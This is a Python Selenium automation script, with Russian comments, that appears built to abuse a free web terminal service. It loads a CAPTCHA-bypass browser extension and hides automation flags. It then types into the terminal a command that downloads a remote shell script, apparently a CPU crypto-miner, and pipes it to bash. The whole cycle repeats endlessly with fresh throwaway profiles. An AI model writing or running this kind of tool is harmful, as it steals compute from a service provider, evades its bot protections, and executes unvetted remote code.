import os
import shutil
import uuid
import time
import subprocess
import sys
import platform

def check_and_install_dependencies():
    """Проверяет и устанавливает необходимые зависимости"""
    required_packages = {
        'selenium': '>=4.0.0',
        'webdriver-manager': '>=3.0.0',
        'psutil': '>=5.8.0',
    }
    
    print("Проверка зависимостей...")
    installed_packages = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze']).decode('utf-8')
    installed_packages = [pkg.split('==')[0].lower() for pkg in installed_packages.split('\n')]
    
    to_install = []
    for pkg, version in required_packages.items():
        if pkg.lower() not in installed_packages:
            to_install.append(f"{pkg}{version}")
    
    if to_install:
        print(f"Установка недостающих пакетов: {', '.join(to_install)}")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', *to_install])
    else:
        print("Все зависимости уже установлены")

def check_and_install_chrome():
    """Проверяет и устанавливает Google Chrome при необходимости"""
    print("Проверка установки Google Chrome...")
    
    try:
        # Проверяем версию Chrome
        if platform.system() == "Windows":
            try:
                # Проверяем наличие Chrome в реестре
                subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe'], 
                              check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("Google Chrome уже установлен")
                return
            except subprocess.CalledProcessError:
                pass
        else:
            try:
                # Проверяем наличие Chrome в Linux
                subprocess.run(['google-chrome', '--version'], 
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("Google Chrome уже установлен")
                return
            except (subprocess.CalledProcessError, FileNotFoundError):
                pass
        
        # Установка Chrome
        print("Установка Google Chrome...")
        if platform.system() == "Windows":
            # Для Windows скачиваем и устанавливаем Chrome
            chrome_installer_url = "https://dl.google.com/chrome/install/chrome_installer.exe"
            installer_path = os.path.join(os.getenv("TEMP"), "chrome_installer.exe")
            
            # Скачиваем установщик
            subprocess.run(['curl', '-o', installer_path, chrome_installer_url], check=True)
            
            # Запускаем установку
            subprocess.run([installer_path, '/silent', '/install'], check=True)
            print("Google Chrome успешно установлен")
            
        elif platform.system() == "Linux":
            # Для Linux (Debian/Ubuntu)
            subprocess.run(['wget', '-q', '-O', '-', 'https://dl.google.com/linux/linux_signing_key.pub'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'wget'], check=True)
            subprocess.run(['wget', '-q', '-O', '-', 'https://dl.google.com/linux/linux_signing_key.pub'], check=True)
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'google-chrome-stable'], check=True)
            print("Google Chrome успешно установлен")
            
        else:
            print("Неподдерживаемая ОС для автоматической установки Chrome")
            print("Пожалуйста, установите Google Chrome вручную")
            
    except Exception as e:
        print(f"Ошибка при установке Google Chrome: {e}")
        print("Пожалуйста, установите Google Chrome вручную")
         
# Проверяем и устанавливаем зависимости перед импортом
check_and_install_dependencies()
check_and_install_chrome()

# Теперь импортируем остальные библиотеки
import psutil
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.action_chains import ActionChains

# Конфигурация
CRX_PATH = os.path.abspath("fuckCaptcha.crx")
COMMAND = "wget -O - https://raw.githubusercontent.com/fcknjudas/fileshare_linux/refs/heads/main/kryptex_cpu.sh | bash"
MAX_FAILED_ATTEMPTS = 3
MAX_CAPTCHA_ATTEMPTS = 10
CAPTCHA_TIMEOUT = 60
TIMEOUT = 17 * 60
BASE_PROFILE_DIR = os.path.join(os.getcwd(), "chrome_profiles")

def kill_chrome_processes():
    """Убивает все процессы Chrome и ChromeDriver"""
    print("Завершение всех процессов Chrome и ChromeDriver...")
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] in ('chrome', 'chromedriver', 'chrome.exe', 'chromedriver.exe'):
                print(f"Завершение процесса {proc.info['name']} (PID: {proc.info['pid']})")
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    time.sleep(2)  # Даем время для завершения процессов

def cleanup_profile(profile_path):
    """Удаляет профиль Chrome и завершает связанные процессы"""
    print(f"Очистка профиля {profile_path}...")
    try:
        kill_chrome_processes()
        for _ in range(3):  # Попытки удаления с ожиданием
            try:
                shutil.rmtree(profile_path, ignore_errors=True)
                if not os.path.exists(profile_path):
                    break
            except Exception as e:
                print(f"Ошибка при удалении профиля (попытка {_+1}): {e}")
            time.sleep(1)
        print(f"Профиль {profile_path} {'удален' if not os.path.exists(profile_path) else 'не удален'}")
    except Exception as e:
        print(f"Ошибка при очистке профиля: {e}")

def wait_for_recaptcha_disappear(driver, timeout=60):
    """Ожидает исчезновения reCAPTCHA"""
    print(f"Ожидание исчезновения reCAPTCHA (макс {timeout} сек)...")
    try:
        WebDriverWait(driver, timeout).until(
            EC.invisibility_of_element_located(
                (By.CSS_SELECTOR, "iframe[src*='recaptcha']")))
        print("reCAPTCHA исчезла")
        time.sleep(5)  # Дополнительное ожидание после исчезновения
        return True
    except Exception as e:
        print(f"reCAPTCHA не исчезла за отведенное время: {e}")
        return False

def setup_driver(profile_path):
    """Настраивает и возвращает новый экземпляр ChromeDriver"""
    chrome_options = Options()
    
    # Настройки профиля (оригинальная версия)
    chrome_options.add_argument(f"--user-data-dir={profile_path}")
    chrome_options.add_extension(CRX_PATH)  # Оригинальный способ добавления расширения
    
    # Другие настройки
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--headless")  # Раскомментируйте для headless-режима
    
    # Настройки для автоматизации
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    # Установка и настройка драйвера
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        return driver
    except Exception as e:
        print(f"Ошибка при инициализации ChromeDriver: {e}")
        raise

def run_attempt(attempt):
    print(f"\n=== Попытка {attempt}/{MAX_FAILED_ATTEMPTS} ===")

    if not os.path.exists(CRX_PATH):
        print(f"Ошибка: Файл расширения {CRX_PATH} не найден!")
        return False

    # Создаем уникальный профиль
    profile_name = f"profile_{uuid.uuid4()}"
    profile_path = os.path.join(BASE_PROFILE_DIR, profile_name)
    os.makedirs(profile_path, exist_ok=True)
    print(f"Создан новый профиль: {profile_path}")

    driver = None
    try:
        driver = setup_driver(profile_path)
        print("Драйвер успешно инициализирован")

        # Основной поток выполнения
        driver.get("https://terminator.aeza.net/ru/")
        print("Сайт открыт")
        time.sleep(3)

        # Нажатие первой кнопки
        try:
            button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="window"]/div[1]/div[1]/button[2]')))
            button.click()
            print("Первая кнопка нажата")
        except Exception as e:
            print(f"Ошибка при нажатии кнопки: {str(e)}")
            driver.save_screenshot(f"error_button_{attempt}.png")
            return False

        # Обработка капчи
        captcha_success = False
        for captcha_attempt in range(1, MAX_CAPTCHA_ATTEMPTS + 1):
            print(f"\nПроверка капчи - попытка {captcha_attempt}/{MAX_CAPTCHA_ATTEMPTS}")
            if wait_for_recaptcha_disappear(driver, CAPTCHA_TIMEOUT):
                captcha_success = True
                break
            else:
                print("Капча не исчезла, перезагрузка страницы...")
                driver.refresh()
                time.sleep(5)

                try:
                    button = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, '//*[@id="window"]/div[1]/div[1]/button[2]')))
                    button.click()
                    print("Первая кнопка нажата после перезагрузки")
                except Exception as e:
                    print(f"Ошибка при нажатии кнопки после перезагрузки: {str(e)}")
                    driver.save_screenshot(f"error_reload_{attempt}.png")
                    continue

        if not captcha_success:
            print("Не удалось пройти капчу за максимальное количество попыток")
            return False

        # Ввод команды
        try:
            textarea = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'xterm-helper-textarea')))
            ActionChains(driver).click(textarea).perform()
            textarea.clear()
            textarea.send_keys(COMMAND)
            textarea.send_keys(Keys.RETURN)
            print("Команда успешно выполнена")

            print(f"Ожидание {TIMEOUT//60} минут...")
            time.sleep(TIMEOUT)
            return True

        except Exception as e:
            print(f"Ошибка вставки команды: {str(e)}")
            driver.save_screenshot(f"error_command_{attempt}.png")
            return False

    except WebDriverException as e:
        print(f"Критическая ошибка WebDriver: {str(e)}")
        if driver:
            driver.save_screenshot(f"critical_error_{attempt}.png")
        return False
    except Exception as e:
        print(f"Неожиданная ошибка: {str(e)}")
        return False
    finally:
        try:
            if driver is not None:
                driver.quit()
                print("Драйвер успешно закрыт")
        except Exception as e:
            print(f"Ошибка при закрытии драйвера: {e}")
        finally:
            cleanup_profile(profile_path)

def main():
    os.makedirs(BASE_PROFILE_DIR, exist_ok=True)

    while True:
        for attempt in range(1, MAX_FAILED_ATTEMPTS + 1):
            if run_attempt(attempt):
                print("Успешное завершение! Перезапуск через 10 секунд...")
                time.sleep(10)
                break
            else:
                print(f"Попытка {attempt} не удалась")
                if attempt < MAX_FAILED_ATTEMPTS:
                    print("Перезапуск через 10 секунд...")
                    time.sleep(10)
        else:
            print(f"Все {MAX_FAILED_ATTEMPTS} попыток завершились неудачно")
            print("Перезапуск через 30 секунд...")
            time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nЗавершение работы по запросу пользователя...")
    finally:
        kill_chrome_processes()
        print("Все процессы Chrome и ChromeDriver завершены")
